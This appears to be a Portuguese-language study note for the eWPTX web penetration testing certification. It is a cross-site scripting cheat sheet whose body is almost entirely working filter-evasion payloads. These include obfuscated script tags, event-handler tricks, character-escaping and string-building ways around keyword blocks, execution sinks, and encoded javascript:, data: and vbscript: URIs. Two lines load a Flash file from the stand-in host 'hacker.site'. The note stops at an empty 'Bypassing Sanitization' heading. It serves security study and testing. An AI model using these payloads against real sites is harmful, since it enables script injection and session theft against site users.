 #INE #WebHacking #eWPTX 

Os dois principais cheat sheet para XSS:

https://html5sec.org/
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

# Bypassing Blacklisting Filters

## Injecting Script Code

**Bypass no bloqueio da tag \<script>**

```html
<ScRiPt>alert(1)</ScRiPt>                  // Upper e Lower case
<ScRiPt>alert(1)                           // Upper e Lower sem fechar a tag
<script/random>alert(1);</script>          // Random string depois da tag name
<script                                    // Newline depois da tag name
>alert(1);</script>
<scr<script>ipt>alert(1)</scr<script>ipt>  // tags alinhadas
<scr\x00ipt>alert(1)</scr\x00ipt>          // NULL byte
```

**Bypass no bloqueio da tag \<script> usando atributos do HTML**

```HTML
<a href="javascript:alert(1)">show</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="//hacker.site/xss.swf">
<object data="//hacker.site/xss.swf" allowscriptaccess=always>
```

Nos dois últimos exemplos, pode-se usar no endereço essa ferramenta:

https://github.com/evilcos/xss.swf

**Bypass no bloqueio da tag \<script> usando eventos do HTML**

Normalmente o evento mais usado é o **onerror**:

```HTMl
<img src=x onerror=alert(1)>
```

Mas existem vários outros eventos que podem ser usados, uma lista com eles se encontra no link:

http://help.dottoro.com/lhwfcplu.php

Alguns exemplos:

```HTML
// HTML 4
<body onload=alert(1)>
<input type=image src=x:x onerror=alert(1)>
<isindex onmouseover="alert(1)">
<form oninput=alert(1)><input></form>
<textarea autofocus onfocus=alert(1)>
<input oncut=alert(1)>

// HTML 5
<svg onload=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<marquee onstart=alert(1)>
```

É muito comum, do ponto de vista defensivo, bloquear eventos que comecem com on*, isso pode ser byppassado com:

```HTML
<svg/onload=alert(1)>
<svg//////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
```

Algumas regras mais avançadas conseguem bloquear esses payloads, elas podem ser bypassadas com os seguintes exemplos:

```HTML
<svg onload%09=alert(1)> // Funciona em todos os browsers menos no Safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)> // IE somente
```

Uma lista de caracteres que podem ser usados entre o evento e o sinal de igual, ou antes do nome do evento:

```
IExplorer = [0x09,0x0B,0x0C,0x20,0x3B]
Chrome = [0x09,0x20,0x28,0x2C,0x3B]
Safari = [0x2C,0x3B]
FireFox = [0x09,0x20,0x28,0x2C,0x3B]
Opera = [0x09,0x20,0x2C,0x3B]
Android = [0x09,0x20,0x28,0x2C,0x3B]
```

Como os browsers estão em constante mudança, existe uma ferramenta que realiza o fuzzing para descobrir os caracteres que podem ser usados de acordo com a versão do browser

http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name
http://shazzer.co.uk/vector/Characters-allowed-brfote-attribute-name

## Keyword Based Filters

**Character scaping**

Imaginando um cenário onde a palavra **alert** está bloqueada (ignorando alternativas como prompt, confirm, etc...)

```HTML
<script>alert(1)</script> // Block

// Sem funções nativa
<script>\u0061lert(1)</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

// Usando função nativa
<script>eval("\u0061lert(1)")</script>
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>

<img src=x onerror="alert(1)"/> // Block

<img src=x onerror="\u0061lert(1)"/>
<img src=x onerror="eval('\141lert(1)')"/>   // Octal
<img src=x onerror="eval('\x61lert(1)')"/>   // Hexadecimal
<img src=x onerror="&#x0061;lert(1)"/>       // Hexadecimal Reference
<img src=x onerror="&#97;lert(1)"/>          // Decimal NCR
<img src=x onerror="eval('\a\l\ert\(1\)')"/> // Superfluous escape
<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>  // Todos juntos
```

**Construindo string**

```javascript
alert // Block

/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116)
atob("YWxlcnQ=")
17795081..toString(36)
```

**Execution Sinks**

Lista completa com todos os sinks:

https://code.google.com/archive/p/domxsswiki/wikis/ExecutionSinks.wiki

```javascript
setTimeout("JSCode")    // Todos os browsers
setInterval("JSCode")   // Todos os browsers
setImmediate("JSCode")  // IE 10+
Function("JSCode")      // Todos os browsers

[].constructor.constructor(alert(1))  // Variação de Function
```

**Pseudo-protocolos**

**javascript:**

javascript: é um URI scheme não oficial, usado para invocar código JavaScript com um link

```HTML
<object data="javascript:alert(1)"> // Block (javascript:)

<object data="JaVaScRiPt:alert(1)">
<object data="javascript&colon;alert(1)">
<object data="java
script:alert(1)">
<object data="javascript&#x003A;alert(1)">
<object data="javascript&#58;alert(1)">
<object data="&#x6A;avascript:alert(1)">
<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
```

Além do **javascript:** também existe o **data:** e o **vbscript:** (exclusivo do IE)

**data:**

Estrutura do data:

	data:[<mediatype>][;base64],<data>

```HTML
<object data="javascript:alert(1)">  // Block (javascript:)

<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<embed code="data:text/html,<script>alert(1)</script>">  // Block (data:)

<embed code="DaTa:text/html,<script>alert(1)</script>">
<embed code="data&colon:text/html,<script>alert(1)</script>">
<embed code="data&#x003A:text/html,<script>alert(1)</script>">
<embed code="&#x64;&#x61ta:text/html,<script>alert(1)</script>">
```

**vbscript:**

```HTML
<img src=a onerror="vbscript:msgbox 1"/>  // IE8
<img src=a onerror="vbs:msgbox 2"/>       // IE8
<img src=a onerror="vbs:alert(3)"/>       // IE Edge
<img src=a onerror="vbscript:alert(4)"/>  // IE Edge

<img src=x onerror="vbscript:alert(1)"/>  // Block (vbscript:)

<img src=x onerror="vbscript&#x003Aalert(1)"/>
<img src=x onerror="vb&#x63;cript:alert(1)"/>
<img src=x onerror="v&#00;bs&#00;cri&#00;pt:alert(1)"/>  // Null byte
```

# Bypassing Sanitization

